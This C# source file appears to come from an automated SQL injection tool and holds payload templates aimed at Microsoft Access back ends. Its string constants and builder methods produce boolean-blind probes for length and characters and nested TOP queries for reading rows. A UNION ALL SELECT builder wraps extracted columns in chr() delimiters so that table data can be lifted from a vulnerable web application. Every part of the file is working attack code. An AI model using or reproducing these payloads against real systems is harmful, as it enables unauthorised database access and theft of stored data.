using System;
using System.Collections.Generic;
using System.Text;

namespace SuperSQLInjection.payload
{
    class Access
    {
        //获取数据条数
        public static String data_count = "(select count(*) from {table})";
 
        //判断条数
        public static String bool_datas_count = " and " + data_count + ">={len}";

        public static String substr = "mid(({data}),{index},1)";

        //bool方式字符长度判断
        public static String bool_length = " and len({data})>{len}";

        public static String bool_value = " and {data}>{len}";

        //获取行数据
        public static String data_value = "(select top 1 {data} from (select top {index} {allcolumns} from {table} order by {orderby} asc) t order by t.{orderby} desc)";

        //union获取值
        public static String union_value = " and 1=2 union all select {data} from {table}";

        //多字符
        public static String unicode_value = "ascw(mid({data},{index},1))";


        public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String table, String index)
        {
            StringBuilder sb = new StringBuilder();
            String data = "chr(94)&chr(94)&chr(33)&" + Comm.unionColumns(columns, "&chr(36)&chr(36)&chr(36)&") + "&chr(33)&chr(94)&chr(94)";
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{table}", table).Replace("{index}", index).Replace("{orderby}", columns[0]));
                    sb.Append(",");
                }
                else
                {
                    sb.Append("1,");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }


        public static String getUnionDataValue(int columnsLen, int showIndex, int Fill, String dataPayLoad)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(chr(94)&chr(94)&chr(33)&" + dataPayLoad + "&chr(33)&chr(94)&chr(94)),");
                }
                else
                {
                    sb.Append(Fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }
        public static String getBoolDataPayLoad(String column,List<String> columns,String dbName, String table, int index)
        {
            String data = data_value.Replace("{data}",column).Replace("{allcolumns}",Comm.unionColumns(columns,",")).Replace("{orderby}",columns[0]);
            String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{data}", column).Replace("{index}", index.ToString());
            return payload;
        }


    }
}
